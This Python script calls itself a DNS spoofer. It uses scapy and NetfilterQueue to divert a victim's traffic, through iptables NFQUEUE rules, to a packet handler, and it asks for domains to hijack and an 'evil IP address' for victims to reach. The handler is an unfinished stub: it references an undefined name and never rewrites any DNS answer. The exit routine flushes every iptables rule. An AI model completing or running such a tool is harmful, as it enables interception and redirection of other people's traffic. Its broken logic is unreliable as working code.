#! /bin/python

import subprocess
import time
from argparse import ArgumentParser

import scapy.all as scapy
from netfilterqueue import NetfilterQueue


def parse_cli_args():
    """Parse arguments from command-line interface."""
    parser = ArgumentParser(prog="DNS Spoofer")
    parser.add_argument("-t", "--target-domains",
                        nargs='+',
                        required=True,
                        metavar="TARGET DOMAIN",
                        dest="targets",
                        help="Domain names that we want to spoof")
    parser.add_argument("-d", "--destined-domain",
                        nargs=1,
                        required=True,
                        metavar="DESTINATION IP ADDRESS",
                        dest="dest",
                        help="Our evil IP address that we want the victim to reach")
    parser.add_argument("-l", "--local",
                        nargs=1,
                        dest="local",
                        help="Use this option if this script is run locally")
    return parser.parse_args()


# Parse CLI arguments
args = parse_cli_args()


def process_packet(packet):
    """A callback function to process a trapped packet."""
    # packet.get_payload() returns the payload as a string
    scapy_packet = scapy.IP(packet.get_payload())

    # Filter interesting packet only
    if scapy_packet.haslayer(scapy.Raw):
        load = scapy_packet[Raw].load
        # Check if this load is what we want to spoof
        if load:
            # if yes, modify the data
            packet.set_payload(str(scapy_packet))
            pass
    packet.accept()


### [MAIN ROUTINE] ###
# INPUT chain is used for packets coming in this machine
# OUTPUT chain is used for packets coming out this machine (after being altered)
# FORWARD chain is used for packets that go through this machine (in & out - after being altered)
if args.local is None:
    subprocess.call(
        "sudo iptables -I FORWARD -j NFQUEUE --queue-num 0", shell=True)
else:
    subprocess.call(
        "sudo iptables -I INPUT -j NFQUEUE --queue-num 0", shell=True)
    subprocess.call(
        "sudo iptables -I OUTPUT -j NFQUEUE --queue-num 0", shell=True)

try:
    queue = NetfilterQueue()
    queue.bind(0, process_packet)
    queue.run()
except KeyboardInterrupt:
    subprocess.call("sudo iptables --flush", shell=True)
    print("[+] Flushing iptables...")
    time.sleep(2)
